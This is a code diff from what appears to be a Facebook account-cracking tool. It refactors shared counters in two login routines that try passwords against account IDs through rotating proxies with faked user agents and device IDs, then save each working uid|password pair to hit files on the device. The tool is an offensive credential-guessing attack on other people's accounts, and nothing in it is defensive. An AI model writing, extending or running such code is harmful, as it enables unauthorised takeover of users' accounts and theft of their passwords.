@@ -6,6 +6,7 @@ import config
 from useragent import get_ua, is_fb_ua, is_mobile_ua
 from uid import creationyear, fake_device_ids
 from proxy import next_proxy
+from config import inc_loop, add_ok
 
 G   = '\x1b[38;5;46m'
 Y   = '\x1b[38;5;220m'
@@ -158,9 +159,9 @@ def login_1(uid):
             if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 _hit_line(1, uid, pw)
                 open('/sdcard/KABBO-M1-HITS.txt', 'a').write(f"{uid}|{pw}\n")
-                config.oks.append(uid)
+                add_ok(uid)
                 break
-        config.loop += 1
+        inc_loop()
     except Exception:
         time.sleep(5)
 
@@ -189,8 +190,8 @@ def login_2(uid):
                 if 'session_key' in str(po):
                     _hit_line(2, uid, pw)
                     open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
-                    config.oks.append(uid)
+                    add_ok(uid)
                     break
         except Exception:
             pass
-    config.loop += 1
+    inc_loop()
